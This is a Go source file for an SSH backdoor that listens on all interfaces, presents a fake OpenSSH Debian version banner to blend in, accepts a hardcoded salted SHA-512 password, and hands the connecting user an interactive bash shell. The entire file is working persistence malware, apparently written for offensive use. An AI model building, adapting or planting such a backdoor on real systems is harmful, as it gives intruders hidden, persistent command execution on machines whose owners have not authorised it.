package main

import (
	"crypto/sha512"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os/exec"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/integrii/flaggy"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

func main() {
	var (
		lport       uint   = 2222
		lhost       net.IP = net.ParseIP("0.0.0.0")
		keyPath     string = "id_rsa"
		fingerprint string = "OpenSSH_8.2p1 Debian-4"
	)

	flaggy.UInt(&lport, "p", "port", "Local port to listen for SSH on")
	flaggy.IP(&lhost, "i", "interface", "IP address for the interface to listen on")
	flaggy.String(&keyPath, "k", "key", "Path to private key for SSH server")
	flaggy.String(&fingerprint, "f", "fingerprint", "SSH Fingerprint, excluding the SSH-2.0- prefix")
	flaggy.String(&hash, "a", "hash", "Hash for backdoor")
	flaggy.Parse()

	log.SetPrefix("SSH - ")
	privKeyBytes, err := ioutil.ReadFile(keyPath)
	if err != nil {
		log.Panicln("Error reading privkey:\t", err.Error())
	}
	privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
	if err != nil {
		log.Panicln("Error parsing privkey:\t", err.Error())
	}
	server := &ssh.Server{
		Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
		Handler:         sshterminal,
		Version:         fingerprint,
		PasswordHandler: passwordHandler,
	}
	server.AddHostKey(privateKey)
	log.Println("Started SSH backdoor on", server.Addr)
	log.Fatal(server.ListenAndServe())
}
func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}

func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}

func sshHandler(s ssh.Session) {
	command := s.RawCommand()
	if command != "" {
		s.Write(runCommand(command))
		return
	}
	term := terminal.NewTerminal(s, "$ ")
	for {
		command, _ = term.ReadLine()
		if command == "exit" {
			return
		}
		term.Write(runCommand(command))
	}
}

func sshterminal(s ssh.Session) {
	cmd := exec.Command("/bin/bash", "-i")
	ptyReq, _, isPty := s.Pty()
	if isPty {
		cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		f, err := pty.Start(cmd)
		if err != nil {
			panic(err)
		}
		go func() {
			io.Copy(f, s) // stdin
		}()
		io.Copy(s, f) // stdout
		cmd.Wait()
	} else {
		io.WriteString(s, "No PTY requested.\n")
		s.Exit(1)
	}
}

func runCommand(cmd string) []byte {
	result := exec.Command("/bin/bash", "-c", cmd)
	response, _ := result.CombinedOutput()
	return response
}

func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
